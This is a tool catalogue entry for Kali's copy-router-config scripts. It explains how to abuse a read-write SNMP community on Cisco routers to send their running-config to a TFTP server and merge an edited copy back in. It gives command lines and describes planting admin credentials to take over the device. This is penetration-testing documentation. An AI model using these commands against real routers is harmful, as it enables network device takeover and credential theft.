---
name: "copy-router-config"
categories:
  - vulnerability
version: "1.0-1kali5"
homepage: "https://www.offsec.com"
origin: "kali"
recipe: "kali-debian"
packaged-by: [kali]
build-system: scripts
meta-checked: "2026-11-09"
github-repo: "foreni-packages/copy-router-config"
github-stars: 2
github-pushed: "2015-09-20"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-07"
worth: 1.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# copy-router-config

> Kali's two-script SNMP attack pair for Cisco devices: pull a router's running-config to your TFTP server, edit it, and merge the modified version back in.

*No corpus evidence — derived from upstream documentation (scripts by muts of Offensive Security as packaged in Kali; verified against the packaged copy-router-config.pl / merge-router-config.pl and the CPAN Cisco::CopyConfig module they drive).*

## What it's for

Two small Perl scripts "hacked up by muts" (Offensive Security) that abuse a read-write SNMP community on a Cisco device. `copy-router-config.pl` tells the router, via SNMP (CISCO-COPY-CONFIG MIB, wrapped by the Perl `Cisco::CopyConfig` module), to copy its running-config out to your TFTP server as the hardcoded filename `pwnd-router.config`; `merge-router-config.pl` pushes your edited `pwnd-router.config` back into the router's running-config. The classic chain is copy → plant a local admin or enable secret → merge → log in. Prerequisites the scripts do not provide: a RW community string (find it with an SNMP bruteforcer yourself) and a reachable TFTP server with a writable root, preferably served from /tmp. Output is minimal — the script prints `OK` on success or the underlying SNMP error.

## Typical use cases

### Exfiltrate a router's running-config

```
copy-router-config.pl 198.51.100.10 198.51.100.252 private
```

Outcome: arguments are `<router-ip> <tftp-serverip> <community>`; with the TFTP server (writable root, e.g. /tmp) running on 198.51.100.252 and RW community `private` on the router, the device's running-config lands as `pwnd-router.config` on the TFTP host and the script prints `OK`. An SNMP error string means the community, the TFTP path or the device's snmp-server config is wrong.

### Merge a modified config back into the router

```
merge-router-config.pl 198.51.100.10 198.51.100.252 private
```

Outcome: the edited `pwnd-router.config` on the TFTP server is merged into the router's running-config — new users, enable secrets or ACL changes take effect immediately on `OK`. Verify by authenticating to the device with the credentials you planted, then clean the config entries up.
